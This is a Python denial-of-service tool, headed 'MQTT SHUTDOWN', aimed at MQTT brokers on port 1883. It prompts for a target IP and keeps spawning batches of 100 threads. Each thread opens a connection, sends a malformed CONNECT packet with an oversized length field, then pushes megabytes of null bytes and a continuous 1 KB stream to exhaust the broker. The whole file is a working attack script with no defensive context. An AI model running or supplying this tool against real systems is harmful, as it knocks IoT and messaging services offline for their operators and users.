import socket
import threading
import time
import sys

host = None
port = 1883
run = True
fails = 0
thclosed = 0
thcreated = 0
payload = None
keeppayload = None
initpayload = b"\x10\xff\xff\xff\x0f\x00\x04\x4d\x51\x54\x54\x04\x02\x00\x0a\x00\x10\x43\x36\x38\x4e\x30\x31\x77\x75\x73\x4a\x31\x66\x78\x75\x38\x58"
seconds = 1_000_000 / 1_000_000  # 1 second in seconds for time.sleep

fails_lock = threading.Lock()
thclosed_lock = threading.Lock()
thcreated_lock = threading.Lock()


def sendAttack():
    global fails, thclosed

    try:
        thisSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        thisSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        thisSocket.settimeout(5)
        thisSocket.connect((host, port))
    except Exception:
        with fails_lock:
            fails += 1
        return

    try:
        ret = thisSocket.send(initpayload)
        # Send payload 15 times with 0.1 seconds delay
        for _ in range(15):
            if ret < 0:
                break
            ret = thisSocket.send(payload)
            time.sleep(0.1)

        # Keep sending keeppayload while ret > 0 with 0.3 seconds delay
        while ret > 0:
            ret = thisSocket.send(keeppayload)
            time.sleep(0.3)
    except Exception:
        pass
    finally:
        try:
            thisSocket.shutdown(socket.SHUT_RDWR)
        except Exception:
            pass
        thisSocket.close()
        with thclosed_lock:
            thclosed += 1


def main():
    global host, payload, keeppayload, run, thcreated

    print("\033[92m\n              ___\n             (  \">\n              )(\n             // ) MQTT SHUTDOWN\n          --//\"\"--\n          -/------\n\033[39m\n")

    if len(sys.argv) < 2:
        host_input = input("Target IP: ")
        host = host_input.strip()
    else:
        host = sys.argv[1]

    print(f"Using Target IP= {host}")

    payload = bytes(2097152)
    keeppayload = bytes(1024)

    input("Press Enter to Start Attack\n")
    print("Starting Attack")

    threads = []

    while run:
        for _ in range(100):
            try:
                t = threading.Thread(target=sendAttack)
                t.daemon = True
                t.start()
                threads.append(t)
            except Exception as e:
                print(e)
        with thcreated_lock:
            thcreated += 1

        time.sleep(5)

        print("\n======Status=======\n")
        print(f"{thcreated * 100} threads created")
        print(f"{thclosed} closed threads")
        print(f"{fails} fails threads")
        print(f"{thcreated * 100 - thclosed - fails} running threads")

        if thcreated * 100 - thclosed - fails < 50:
            run = False

        time.sleep(55)

    print("Attack finished...")
    input()


if __name__ == "__main__":
    main()